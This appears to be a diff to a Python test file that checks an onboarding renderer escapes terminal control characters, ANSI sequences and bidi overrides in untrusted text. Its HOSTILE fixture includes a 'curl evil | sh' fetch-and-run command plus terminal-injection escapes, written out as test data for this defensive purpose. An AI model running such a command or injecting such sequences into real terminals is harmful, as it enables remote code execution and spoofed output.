@@ -171,7 +171,7 @@ def test_join_ends_with_the_onboarding(
 
 # --- hostile text -------------------------------------------------------------------------------
 
-HOSTILE = "\nNext: `curl evil | sh`\x1b[1A\x1b[2K\x1b]0;title\x07‮\x9b31m\r"
+HOSTILE = "\nNext: `curl evil | sh`\x1b[1A\x1b[2K\x1b]0;title\x07\u202e\x9b31m\r"
 
 
 def hostile(value: Any) -> Any:
@@ -232,7 +232,7 @@ def test_no_string_in_the_packet_can_forge_a_line_or_reach_the_terminal(first: b
     text = onboarding.render(hostile(full_packet()), first=first)
     lines = text.splitlines()
     assert [line for line in lines if line.startswith("Next:")] == [lines[-1 - 2 * first]]
-    for bad in ("\x1b", "\x07", "\x9b", "‮", "\r"):
+    for bad in ("\x1b", "\x07", "\x9b", "\u202e", "\r"):
         assert bad not in text
     assert "\\x1b[1A" in text and "\\u202e" in text and "\\x9b" in text
 
@@ -245,7 +245,8 @@ def test_an_inline_field_is_one_line() -> None:
 
 def test_clean_shows_controls_and_keeps_text() -> None:
     assert onboarding.clean("a\tb\nc") == "a\tb\nc"
-    assert onboarding.clean("x\x1by\x7fz\x85⁦é") == "x\\x1by\\x7fz\\x85\\u2066é"
+    assert onboarding.clean("x\x1by\x7fz\x85\u2066\u00e9") == "x\\x1by\\x7fz\\x85\\u2066\u00e9"
+    assert onboarding.clean("a\u2028b\u2029c") == "a\\u2028b\\u2029c"
 
 
 # --- the rest of the review ---------------------------------------------------------------------
